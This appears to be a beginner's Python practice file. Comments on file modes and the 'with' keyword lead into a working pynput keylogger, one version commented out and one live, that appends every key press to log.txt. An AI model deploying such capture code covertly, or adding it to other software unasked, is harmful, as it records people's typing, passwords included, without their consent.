

#f= open("log.txt",'w')
#f.write("i am awesome")
#f.close()
#'a' - append file
#'w' - write file
#'r' - read file
#//  --- with keyword ---releases memory and resources automatically
"""with open("log.txt",'a') as f:
    f.write("hello again")                 """
  #---pynput---libarary for controlling input streams(listens and controls 'mouse' and 'keyboard')  
  #saving the instance of Listener as l          #writetofile is a function...on-press is a parameter
  
  
""" 
from pynput.keyboard import Listener
def writetofile(key):
     letter=str(key)
     letter=letter.replace("'","")
     
     
     if letter== 'Key.space':
        letter = ' '
     if letter== 'Key.shift_r':
        letter = ''
     if letter== "Key.ctrl_l":
        letter = ""
     if letter== "Key.enter":
        letter = "\n"

     with open("log.txt",'a') as f:
         f.write(letter)   
with Listener(on_press=writetofile)as l:  
    l.join()            #this makes sure that all keystrokes are joined together
  """  
from pynput.keyboard import Listener, Key

def writetofile(key):
    with open("log.txt", 'a') as f:
        if hasattr(key, 'char'):  # Regular character
            f.write(key.char)
        elif key == Key.space:  # Space
            f.write(' ')
        elif key == Key.enter:  # Enter
            f.write('\n')

with Listener(on_press=writetofile) as l:
    l.join()
